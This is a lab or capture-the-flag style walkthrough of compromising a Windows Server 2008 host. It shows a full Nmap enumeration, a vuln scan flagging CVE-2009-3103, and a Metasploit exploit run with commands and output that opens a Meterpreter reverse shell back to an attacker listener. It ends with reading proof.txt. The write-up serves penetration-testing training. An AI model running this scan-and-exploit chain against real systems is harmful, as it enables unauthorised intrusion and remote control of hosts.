## NMAP

This command performed a comprehensive, non-stealth port scan of the target 192.168.176.40. The `sudo` privilege was used to enable raw packet capabilities for more accurate operating system detection. The `-Pn` flag treated the host as online, bypassing the initial ping probe. The scan checked all TCP ports from 1 to 65535, but only reported those in the `--open` state. It combined service and version detection (`-sV`) with default script scanning (`-sC`) and operating system fingerprinting (`-O`). The objective was to perform a full port enumeration to discover all accessible services, their versions, and the host's OS, leaving no TCP port unchecked

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.176.40  --open 
```

This is the output of the comprehensive Nmap scan. The target is identified as a Windows Server 2008 Standard SP1 host named "INTERNAL". Key open services include DNS on port 53, MSRPC on port 135, NetBIOS on port 139, and SMB on port 445. The SMB service indicates message signing is disabled, which is a security misconfiguration. Port 3389 is running Microsoft Terminal Services with an SSL certificate for the hostname "internal". Multiple high-numbered ports are open for MSRPC. The host script results confirm the operating system, hostname, workgroup, and reveal that the SMB service supports legacy authentication without requiring signing. This enumeration provides a clear attack surface targeting legacy Windows protocols, particularly SMB.

```bash
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-07-24T21:18:58
|_Not valid after:  2026-01-23T21:18:58
|_ssl-date: 2025-12-16T19:52:45+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-12-16T19:52:37+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-time: 
|   date: 2025-12-16T19:52:37
|_  start_date: 2025-07-25T21:18:51
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-16T11:52:37-08:00
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:9c:2e (VMware)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.95 seconds

```

This command executed a targeted vulnerability scan against the SMB ports 139 and 445 on the target 192.168.176.40 using Nmap's `vuln` script category. The results indicate the host is vulnerable to CVE-2009-3103, also known as the SMBv2 Negotiation Vulnerability. This is a critical remote code execution flaw affecting Windows Server 2008. The scan confirmed the vulnerability is present and exploitable. Other vulnerability checks for MS10-054, MS10-061, and a Samba flaw either returned false or timed out during negotiation. This finding provides a direct and confirmed exploitation path against the legacy SMB service on this host.

```bash
sudo nmap -p 139,445 --script vuln 192.168.176.40

Starting Nmap 7.95SVN ( https://nmap.org ) at 2025-12-16 19:58 UTC
Nmap scan report for 192.168.176.40
Host is up (0.0086s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

Nmap done: 1 IP address (1 host up) scanned in 55.97 seconds


```

This command initiated the exploitation of the identified SMBv2 vulnerability (CVE-2009-3103) using the Metasploit framework. The exploit module `ms09_050_smb2_negotiate_func_index` was selected and configured with the target host IP as RHOSTS and the attacker's IP as LHOST for the reverse shell connection. The target port was set to 445, the standard SMB port. Upon execution, the exploit successfully connected to the target, sent a malicious negotiation packet, and triggered the vulnerability. This resulted in the establishment of a Meterpreter reverse TCP shell session, granting remote code execution on the Windows Server 2008 host. The session was opened from the target's port 49159 back to the attacker's listener on port 1337.

```bash
msf6 >  use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS  192.168.176.40
RHOSTS => 192.168.176.40
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) >  set LHOST 192.168.45.172
LHOST => 192.168.45.172
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) >  set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LPORT 1337
LPORT => 1337
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
[*] Started reverse TCP handler on 192.168.45.172:1337 
[*] 192.168.176.40:445 - Connecting to the target (192.168.176.40:445)...
[*] 192.168.176.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.176.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (177734 bytes) to 192.168.176.40
[*] Meterpreter session 1 opened (192.168.45.172:1337 -> 192.168.176.40:49159) at 2025-12-16 21:14:00 +0000

```

This command transitioned the Meterpreter session to a standard Windows command shell. Post-exploitation reconnaissance was performed by navigating the file system. The shell session confirmed the compromised host is running Windows Server 2008 (Version 6.0.6001). The user directory was enumerated, revealing a standard "Administrator" user account. Navigation to the Administrator's Desktop directory identified two key files: `proof.txt` and `network-secret.txt`. The contents of `proof.txt` were displayed, revealing a hash or unique identifier string "783996cb9b811c403f5b76807796a43f". This file is commonly used as proof of successful system compromise during penetration tests. The presence of this file, along with the ability to read it, demonstrates successful privilege escalation and access to a sensitive user directory.

```bash
meterpreter > shell
Process 1884 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>cd users
cd users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users

01/08/2010  03:28 AM    <DIR>          .
01/08/2010  03:28 AM    <DIR>          ..
01/08/2010  03:41 AM    <DIR>          Administrator
01/19/2008  01:40 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   4,110,811,136 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator

01/08/2010  03:41 AM    <DIR>          .
01/08/2010  03:41 AM    <DIR>          ..
01/08/2010  03:28 AM    <DIR>          Contacts
02/03/2011  07:51 PM    <DIR>          Desktop
01/08/2010  03:28 AM    <DIR>          Documents
03/25/2010  11:28 PM    <DIR>          Downloads
01/08/2010  03:28 AM    <DIR>          Favorites
01/08/2010  03:28 AM    <DIR>          Links
01/08/2010  03:28 AM    <DIR>          Music
01/08/2010  03:28 AM    <DIR>          Pictures
01/08/2010  03:28 AM    <DIR>          Saved Games
01/08/2010  03:28 AM    <DIR>          Searches
01/08/2010  03:28 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   4,110,811,136 bytes free


C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  07:51 PM    <DIR>          .
02/03/2011  07:51 PM    <DIR>          ..
05/20/2016  09:26 PM                32 network-secret.txt
12/16/2025  01:11 PM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,110,811,136 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
783996cb9b811c403f5b76807796a43f


```